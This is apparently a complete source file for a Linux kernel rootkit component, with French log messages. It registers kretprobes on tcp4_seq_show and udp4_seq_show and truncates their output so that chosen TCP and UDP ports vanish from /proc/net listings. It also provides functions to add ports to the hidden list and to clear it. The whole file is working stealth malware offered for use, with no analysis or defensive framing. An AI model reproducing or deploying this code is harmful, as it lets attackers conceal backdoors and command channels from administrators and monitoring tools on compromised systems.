#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/seq_file.h>
#include <linux/spinlock.h>
#include <net/sock.h>
#include "hide_net.h"

static DEFINE_SPINLOCK(net_lock);

static unsigned int hidden_ports[MAX_HIDDEN_PORTS];
static int          hidden_ports_count = 0;

/* --- TCP4 --- */

struct tcp_data {
    struct seq_file *seq;
    void           *v;
    size_t          count;
};

static int entry_tcp4_seq_show(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct tcp_data *d = (struct tcp_data *)ri->data;
    d->seq   = (struct seq_file *)regs->di;
    d->v     = (void *)regs->si;
    d->count = d->seq->count;
    return 0;
}

static int ret_tcp4_seq_show(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct tcp_data *d = (struct tcp_data *)ri->data;
    struct sock *sk;
    unsigned long flags;
    int i;

    if (!hidden_ports_count || d->v == SEQ_START_TOKEN)
        return 0;

    sk = (struct sock *)d->v;

    spin_lock_irqsave(&net_lock, flags);
    for (i = 0; i < hidden_ports_count; i++) {
        if (sk->sk_num == hidden_ports[i]) {
            d->seq->count = d->count;
            break;
        }
    }
    spin_unlock_irqrestore(&net_lock, flags);

    return 0;
}

static struct kretprobe krp_tcp = {
    .handler        = ret_tcp4_seq_show,
    .entry_handler  = entry_tcp4_seq_show,
    .data_size      = sizeof(struct tcp_data),
    .maxactive      = 20,
    .kp.symbol_name = "tcp4_seq_show",
};

/* --- UDP4 --- */

struct udp_data {
    struct seq_file *seq;
    void           *v;
    size_t          count;
};

static int entry_udp4_seq_show(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct udp_data *d = (struct udp_data *)ri->data;
    d->seq   = (struct seq_file *)regs->di;
    d->v     = (void *)regs->si;
    d->count = d->seq->count;
    return 0;
}

static int ret_udp4_seq_show(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct udp_data *d = (struct udp_data *)ri->data;
    struct sock *sk;
    unsigned long flags;
    int i;

    if (!hidden_ports_count || d->v == SEQ_START_TOKEN)
        return 0;

    sk = (struct sock *)d->v;

    spin_lock_irqsave(&net_lock, flags);
    for (i = 0; i < hidden_ports_count; i++) {
        if (sk->sk_num == hidden_ports[i]) {
            d->seq->count = d->count;
            break;
        }
    }
    spin_unlock_irqrestore(&net_lock, flags);

    return 0;
}

static struct kretprobe krp_udp = {
    .handler        = ret_udp4_seq_show,
    .entry_handler  = entry_udp4_seq_show,
    .data_size      = sizeof(struct udp_data),
    .maxactive      = 20,
    .kp.symbol_name = "udp4_seq_show",
};

/* --- API --- */

void set_hidden_port(unsigned int port)
{
    unsigned long flags;

    spin_lock_irqsave(&net_lock, flags);
    if (hidden_ports_count < MAX_HIDDEN_PORTS) {
        hidden_ports[hidden_ports_count++] = port;
        printk(KERN_INFO "port %u caché (%d/16)\n", port, hidden_ports_count);
    } else {
        printk(KERN_WARNING "liste ports pleine\n");
    }
    spin_unlock_irqrestore(&net_lock, flags);
}

void clear_hidden_ports(void)
{
    unsigned long flags;

    spin_lock_irqsave(&net_lock, flags);
    hidden_ports_count = 0;
    printk(KERN_INFO "liste ports vidée\n");
    spin_unlock_irqrestore(&net_lock, flags);
}

int hide_net_init(void)
{
    int ret;

    ret = register_kretprobe(&krp_tcp);
    if (ret < 0) {
        printk(KERN_ERR "kretprobe tcp4_seq_show échoué: %d\n", ret);
        return ret;
    }

    ret = register_kretprobe(&krp_udp);
    if (ret < 0) {
        printk(KERN_WARNING "kretprobe udp4_seq_show échoué: %d (UDP non caché)\n", ret);
        /* pas fatal — on continue sans UDP */
    }

    printk(KERN_INFO "tcp4 + udp4 hookées\n");
    return 0;
}

void hide_net_exit(void)
{
    unregister_kretprobe(&krp_udp);
    unregister_kretprobe(&krp_tcp);
    printk(KERN_INFO "tcp4 + udp4 remises en place\n");
}
